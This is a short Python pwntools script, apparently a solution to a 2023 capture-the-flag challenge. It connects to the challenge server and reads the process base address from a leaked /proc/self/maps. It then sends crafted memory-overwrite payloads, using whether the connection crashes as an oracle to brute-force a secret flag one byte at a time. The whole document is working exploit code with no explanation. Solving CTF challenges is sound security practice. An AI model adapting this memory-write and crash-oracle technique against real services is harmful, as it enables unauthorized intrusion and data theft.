#!/usr/bin/env python3

from pwn import *

context.log_level = 'info'

flag = b''

base_addr = 0

def overwrite(address, num_bytes, start_chr=b'0'):
    address += base_addr
    address_str = hex(address).encode('utf-8')
    num_bytes = str(num_bytes).encode('utf-8')
    payload = start_chr + address_str[1:] + b' ' + num_bytes
    return payload

num_bytes = 1
address = 0x20bc

while flag[-1:] != b'}':
    for i in range(0x20, 0x7f):
        c = chr(i).encode('utf-8')
        p = remote('wfw2.2023.ctfcompetition.com', 1337)

        p.recvuntil(b'fluff\n')

        # /proc/self/maps is printed, so just get the first address
        # and use it as the base address
        base_addr = int(p.recvline().split(b'-')[0], 16)
        log.info('base_addr: ' + hex(base_addr))

        p.recvuntil(b'\n\n\n')

        p.sendline(overwrite(address, num_bytes))
        try:
            p.sendline(overwrite(address, num_bytes, c))
            p.recv(1, timeout=1)
            log.info('Success')
            flag += c
            p.close()
            log.info('flag: ' + flag.decode('utf-8'))
            break
        except EOFError:
            log.info("EOFError")
            p.close()
    address -= 1
    num_bytes += 1
